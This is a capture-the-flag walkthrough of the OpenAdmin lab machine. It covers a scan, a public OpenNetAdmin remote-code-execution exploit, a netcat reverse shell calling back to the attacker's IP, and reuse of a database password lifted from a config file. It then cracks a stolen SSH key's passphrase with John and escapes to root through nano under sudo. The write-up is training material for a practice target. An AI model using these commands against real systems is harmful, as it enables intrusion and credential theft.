# OpenAdmin

## Nmap

```
sudo nmap 10.10.10.171 -p- -sS -sV

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Checking port 80 we find the root page directs us to the default Apache 2 install web page.

![http://10.10.10.171/](<../../../.gitbook/assets/image (1684) (1).png>)

Running dirsearch.py against the target we find multiple directories:

```
sudo python3 dirsearch.py -u http://10.10.10.171/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --full-url -t 75 
```

![](<../../../.gitbook/assets/image (1685).png>)

I manually looked through the discovered directories which pulled webpages. However I was unable to identify any interesting information contained in these pages.

I then started OWASP ZAP and ran a active spider against the site. ZAP soon picks up the sub page of /ona.

![](<../../../.gitbook/assets/image (1689).png>)

Browsing to /ona:

![http://10.10.10.171/ona/](<../../../.gitbook/assets/image (1690).png>)

We see from the header in the tab this is 'OpenNatAdmin'. From the webpage we can see we are running version v18.1.1

**What is OpenNetAdmin?**

OpenNetAdmin is a system for tracking IP network attributes in a database. A web interface is provided to administer the data, and there is a fully functional CLI interface for batch management (for those of you who prefer NOT to use a GUI). There are also several backend processes for building DHCP, DNS, router configuration, etc.

Checking `searchsploit` for known exploits we get results for a RCE.

![](<../../../.gitbook/assets/image (1691).png>)

Further exploit searching shows a reliable Python exploit for OpenNetAdmin:

{% embed url="https://github.com/amriunix/ona-rce" %}

Clone the respository:

```
sudo git clone https://github.com/amriunix/ona-rce.git 
```

Then execute the script:

```
python3 ona-rce.py exploit http://10.10.10.171/ona
```

![](<../../../.gitbook/assets/image (1692).png>)

Whilst we do have shell this one is bound to the current directory and as such we cannot easily navigate the target system. To resolve this first I checked available useful software on the target system.

```
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

![](<../../../.gitbook/assets/image (1696).png>)

Which shows `nc` as being on the target system. I then set a `netcat` listener on my attacking machine to port 443.

```
sudo nc -lvp 443
```

Then executed the following `netcat` reverse shell on the target system:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.29 443 >/tmp/f
```

![](<../../../.gitbook/assets/image (1697) (1).png>)

Now we have a full reverse shell. After some manual enumeration I found some interesting information in `/opt/ona/www/local/config/database_settings.inc.php`.

![](<../../../.gitbook/assets/image (1698).png>)

We have discovered the following MySQL credentials: `ona_sys:n1nj4W4rri0R!` We can also check for password reuse. Looking at the home directory we have two users: jimmy and joanna.

I tried using SSH as jimmy and was given access with the password above.

![](<../../../.gitbook/assets/image (1699).png>)

From here further enumeration again shows a directory named 'internal' only accessible to jimmy and members of the internal group.

![](<../../../.gitbook/assets/image (1700).png>)

Then the following files inside the directory:

![](<../../../.gitbook/assets/image (1701).png>)

Checking the contents of main:

![](<../../../.gitbook/assets/image (1702).png>)

Looks like when the PHP file is executed it will retrieve Joanna's SSH key. We know this directory is not under the normal port 80.

Checking `netstat` we see something is running locally on port 52846.

![](<../../../.gitbook/assets/image (1703).png>)

Running curl against the local port and main.php gives us a valid result.

```
curl http://127.0.0.1:52846/main.php
```

![](<../../../.gitbook/assets/image (1704) (1).png>)

Copy the key to the attacking machine and set correct key permissions:

```
chmod 600 id_rsa
```

As we can see from the line 'Proc-Type: 4,ENCRYPTED' we will need a password to authorize against the key when connecting over SSH.

We can use ssh2john.py we generate a hash from this keyfile then crack with John.

```
python2 /usr/share/john/ssh2john.py id_rsa > hash.txt
```

The crack with `John`.

```
sudo john --wordlist=/usr/share/wordlists/rockyou.txt /home/kali/Desktop/hash.txt
```

![](<../../../.gitbook/assets/image (1705) (1).png>)

We can then use SSH and login as joanna after specifying and authorizing against the SSH key. Using the password found above in John to proceed when asked for a passphrase

```
ssh -i id_rsa joanna@10.10.10.171
```

![](<../../../.gitbook/assets/image (1706).png>)

Checking `sudo -l` for `sudo` privileges we see that we can run `/bin/nano /opt/priv` as anyone without providing a password.

![](<../../../.gitbook/assets/image (1707).png>)

Checking nano against [GTFOBins](https://gtfobins.github.io/gtfobins/nano/) we see we can spawn a shell with the nano binary.

![](<../../../.gitbook/assets/image (1708).png>)

To spawn a root shell run the following command:

```
sudo -u /bin/nano /opt/priv
```

When in a nano editor press the following keys:

```
CTRL+R
CTRL+X

Then when prompted paste and execute the following:

reset; sh 1>&0 2>&0
```

![](<../../../.gitbook/assets/image (1709).png>)
